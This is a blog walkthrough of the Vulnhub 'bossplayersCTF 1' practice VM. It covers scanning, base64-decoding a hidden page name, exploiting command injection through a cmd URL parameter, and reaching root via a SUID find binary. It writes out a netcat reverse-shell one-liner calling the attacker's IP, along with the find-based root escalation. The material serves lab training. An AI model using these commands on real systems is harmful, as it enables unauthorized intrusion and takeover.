---
title: 'bossplayersCTF 1: Vulnhub Walkthrough'
date: 2019-10-09T08:08:00+01:00
draft: false
---

bossplayersCTF 1 VM is made by [Cuong Nguyen](https://sudocuong.com/). This VM is a purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing. It is of intermediate level and is very handy in order to brush up your skills as a penetration tester. The ultimate goal of this challenge is to get root and to read the root flag.

Level: Intermediate

Since these labs are available on the Vulnhub Website. We will be downloading the lab file from this [link](https://www.vulnhub.com/entry/bossplayersctf-1,375/).

### **Penetration Testing Methodology**

**Network Scanning**

*   netdiscover
*   nmap port scan

**Enumeration**

*   Browsing HTTP Service
*   Performing Directory Bruteforce
*   Decoding Encoded Text

**Exploiting**

*   Command Injection

**Privilege Escalation**

*   SUID on find command

**Capture the flag**

### **Walkthrough**

### **Network Scanning**

The first step to attack is to identify the target. So, identify your target. To identify the target, we will use the following command:

```
netdiscover
```

![](https://i0.wp.com/1.bp.blogspot.com/-VHsvd-HZoBo/XZ1rqz5xPnI/AAAAAAAAg4M/_D2WaNClQFoix3e71KoeDx1EhommgRjTACLcBGAsYHQ/s1600/1.png?w=687&ssl=1)

Now we will run an aggressive port scan using nmap to gain the information about the open ports and the services running on the target machine.

```
nmap -A 192.168.1.107
```

We learned from the scan that we have the port 80 open which is hosting Rocket httpd service, and we have the port 22 open. This tells us that we also have the OpenSSH service running on the target machine.

![](https://i2.wp.com/1.bp.blogspot.com/-MC1SuP6tklg/XZ1rsJcLbSI/AAAAAAAAg4c/3PhPv_tAflcK0wB81IAPZOorYQ1Dh4iMQCLcBGAsYHQ/s1600/3.png?w=687&ssl=1)

### **Enumeration**

Further, we need to start enumeration against the host machine, therefore we navigated to a web browser for exploring HTTP service. Here we have the description of the machine that tells us that this is an extremely easy CTF. It is for those who are getting started with the CTFs. It also tells us that there might be rabbit holes. So we will try to avoid those.

![](https://i2.wp.com/1.bp.blogspot.com/-PgrwiX3UxAk/XZ1rsolgTkI/AAAAAAAAg4g/LwKFAksIoZAthCPfwrbVC7UcXccxFcuFACLcBGAsYHQ/s1600/4.png?w=687&ssl=1)

Now as the convention, we checked the source code of the webpage in the hope to get some valuable hint to move forward with our enumeration. Here, we got an encoded value. This might lead us somewhere.

![](https://i1.wp.com/1.bp.blogspot.com/-wU0FooJlCeY/XZ1rtA3GcXI/AAAAAAAAg4k/b141fkFz8eImxenxwCcGbY4JK2nKE_9HACLcBGAsYHQ/s1600/5.png?w=687&ssl=1)

But we wanted to further enumerate with a directory bruteforce. To do this we will use the dirb. With this directory bruteforce scan, we got a robots.txt file. On browsing it on our web browser we see that we have another encoded text titled as super-secret password. We decoded it to find a troll message “lol try harder bro”. This might be the rabbit hole mentioned earlier. 

```
drib http://192.168.1.107/
```

![](https://i0.wp.com/1.bp.blogspot.com/-66qGqwwKfuc/XZ1rtgKO_PI/AAAAAAAAg4o/_kPXUQ6y4SkhCskIIel7YSzSiHd6VrfSgCLcBGAsYHQ/s1600/6.png?w=687&ssl=1)

We went back to the commented encoded text we found earlier in the Source code of the webpage. It seemed like Base64, so we tried to decode it using base64 command. It gave back another encoded text. This also seemed like Base64, so we decoded it again. This gave back another encoded text. This is getting really tiring. Now we decoded it again to find workinginprogress.php. Not this seems important. All those decodings were not gone for waste.

```
echo "WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK" | base64 -d  
ZDI5eWEybHVaMmx1Y0hKdlozSmxjM011Y0dod0NnPT0K  
echo "ZDI5eWEybHVaMmx1Y0hKdlozSmxjM011Y0dod0NnPT0K" | base64 -d  
d29ya2luZ2lucHJvZ3Jlc3MucGhwCg==  
echo "d29ya2luZ2lucHJvZ3Jlc3MucGhwCg==" | base64 -d
```

![](https://i2.wp.com/1.bp.blogspot.com/-Igj9aNM8OAk/XZ1ruAo34NI/AAAAAAAAg4s/3sBjKiueo5ImK4hopl96BQX_ifwg-q1ygCLcBGAsYHQ/s1600/7.png?w=687&ssl=1)

We tried to open this file on our Web Browser as shown in the image given below. It was a checklist of some kind. It showed that Linux Debian is installed, Apache2 is installed and PHP is also installed. But the stuff that’s not completed tests the ping command and fix the privilege escalation. These seem like major hints.  

```
http://192.168.1.107/workinginprogress.php
```

![](https://i0.wp.com/1.bp.blogspot.com/-LZDCFlMHKII/XZ1ruj8SP2I/AAAAAAAAg4w/khQiNGwH_B8hbL0bgsJAbvlM1TwIWKqKACLcBGAsYHQ/s1600/8.png?w=687&ssl=1)

### **Exploiting**

As it said to test the ping command, it got us thinking that this might, in fact, be command injection. To further inspect this suspicion, we tried to run the id command through the URL as shown in the image given below. This made our suspicion true. This, in fact, is Command Injection.  

```
http://192.168.1.107/workinginprogress.php?cmd=id
```

![](https://i1.wp.com/1.bp.blogspot.com/-8c_jm7PYvu0/XZ1ru0kikkI/AAAAAAAAg40/SrHCux5ScnwfiTco771xNu5s075bC5qywCLcBGAsYHQ/s1600/9.png?w=687&ssl=1)

To exploit command injection, we will be using the netcat invoke shell one-liner. Before running that we need a netcat listener to receive the shell that is going to be invoked.

```
nc -lvp 1234
```

After running the listener, we went back to our browser, and here instead of the id command that we ran previously, it was time to run the shell invocation command. Here we invoked bin/bash shell to the IP Address 192.168.1.105 \[Kali Linux\]. With the port that we started the listener with.

```
http://192.168.1.107/workinginprogress.php?cmd=nc -e /bin/bash 192.168.1.105 1234
```

![](https://i0.wp.com/1.bp.blogspot.com/-2qmaVnuHft4/XZ1rqwNzNWI/AAAAAAAAg4U/BbMwQzaqnwshiZA9ZzY3AnJJQhUncJUYgCLcBGAsYHQ/s1600/10.png?w=687&ssl=1)

Now, we went back to our terminal, where we ran the netcat listener. We see that we have successfully got a session. But the shell that came with the session is an improper one. So in order to convert it into a proper shell, we ran the python one-liner. This gave us a proper shell. As soon as we got this shell, we saw that the session that we got is of user www-data. This means that this is an unprivileged shell. We will have to work out a way to that elevated privilege shell. For this, we start to enumerate the target machine through the shell we got.

```
python -c 'import pty;pty.spawn("/bin/bash")'  
find / -perm -u=s -type f 2>/dev/null
```

As a part of our enumeration procedure, we ran the find command with -perm parameter to search for any file having SUID permissions. The find command itself has this permission. This made our job a little easy.

![](https://i2.wp.com/1.bp.blogspot.com/-e78FQ0mxYaM/XZ1rq-SyCQI/AAAAAAAAg4Q/5yEBgWiI_WQz2EiQyxsUlAmV7LnywND6gCLcBGAsYHQ/s1600/11.png?w=687&ssl=1)

### **Privilege Escalation**

We ran the find command and tried to invoke the /bin/sh shell using it as shown in the image given below. This gave back us a root shell. We confirmed this is a root shell by running the id command.

```
find . -exec /bin/sh -p \\; -quit   
id   
cd /root   
ls   
cat root.txt
```

Now we wanted to enumerate for the Root Flag. We went into the home directory of the root user. Here we found the file named root.txt. On opening it we got a base64 encoded text. It said “congratulations”. This concludes this CTF Challenge.

**NOTE: Here we ran typed the command as simply we enter. The shell however just prints what we type again with it. So it gave the look as shown in the image.**

![](https://i2.wp.com/1.bp.blogspot.com/-o6Y47DxahsE/XZ1rrk2ZA1I/AAAAAAAAg4Y/ITXhxZEmxT0ILOq9beBHTvvshc3n4IzaQCLcBGAsYHQ/s1600/12.png?w=687&ssl=1)

**Author: Pavandeep Singh** is a Technical Writer, Researcher and Penetration Tester Contact [**here**](https://www.linkedin.com/in/pavandeep-singh-6b1074132)

The post [bossplayersCTF 1: Vulnhub Walkthrough](https://www.hackingarticles.in/bossplayersctf-1-vulnhub-walkthrough/) appeared first on [Hacking Articles](https://www.hackingarticles.in).

  
  
from Hacking Articles https://ift.tt/35jf8iK